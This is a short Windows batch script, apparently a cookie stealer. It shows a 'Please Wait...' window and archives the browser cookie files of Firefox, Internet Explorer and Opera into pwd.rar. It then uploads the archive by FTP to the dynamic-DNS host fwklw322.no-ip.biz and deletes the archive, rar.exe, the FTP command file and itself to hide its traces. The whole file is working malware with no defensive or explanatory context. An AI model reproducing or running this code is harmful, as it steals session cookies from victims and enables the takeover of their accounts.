@echo off
cd %homedrive%
color 01
title Please Wait...
echo a> eftep
echo b>> eftep
echo bin >> eftep
echo !cls >> eftep
echo put pwd.rar wt.rar >> eftep
echo quit >> eftep
if not exist "%userprofile%\dane aplikacji\mozilla\firefox\profiles\" goto a
rar a -o+ -r pwd.rar "%userprofile%\dane aplikacji\mozilla\firefox\profiles\cookies.txt" > nul
:a
if not exist "%userprofile%\cookies\" goto b
rar a -o- -r pwd.rar "%userprofile%\cookies\*.txt" > nul
:b
if not exist "%userprofile%\Dane aplikacji\Opera\Opera\profile\cookies4.dat" goto c
rar a -o- pwd.rar "%userprofile%\Dane aplikacji\Opera\Opera\profile\cookies4.dat" > nul
:c
%systemroot%\system32\ftp -v -s:eftep fwklw322.no-ip.biz
del pwd.rar
del rar.exe
del eftep
del %0